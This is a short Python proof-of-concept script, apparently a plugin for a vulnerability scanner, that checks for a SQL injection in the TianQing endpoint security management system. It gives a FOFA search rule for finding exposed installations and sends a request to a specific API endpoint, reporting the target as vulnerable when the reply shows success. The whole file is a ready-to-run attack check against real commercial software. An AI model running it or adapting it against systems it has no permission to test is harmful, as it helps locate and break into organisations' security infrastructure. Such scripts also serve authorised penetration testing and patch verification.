#!/usr/bin/env python3
# _*_ coding:utf-8 _*_

import requests

requests.packages.urllib3.disable_warnings()

# 脚本信息
######################################################
NAME='TianQing_SQLinjection'
AUTHOR="JDQ"
REMARK='天擎终端安全管理系统SQL注入'
FOFA_RULE='icon_hash="-829652342"'
######################################################

def poc(target):
    result = {}
    headers={
        "User-Agent": "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50"
    }

    try:
        r = requests.get(target+"/api/dp/rptsvcsyncpoint?ccid=1",headers=headers, verify=False,timeout=10)
        if r.status_code==200 and 'result":0,"reason":"success' in r.text:
            result['vurl'] = target + "/api/dp/rptsvcsyncpoint?ccid=1"
            result['poc'] = NAME
            return result
    except:
        pass

if __name__ == '__main__':
    poc("http://127.0.0.1")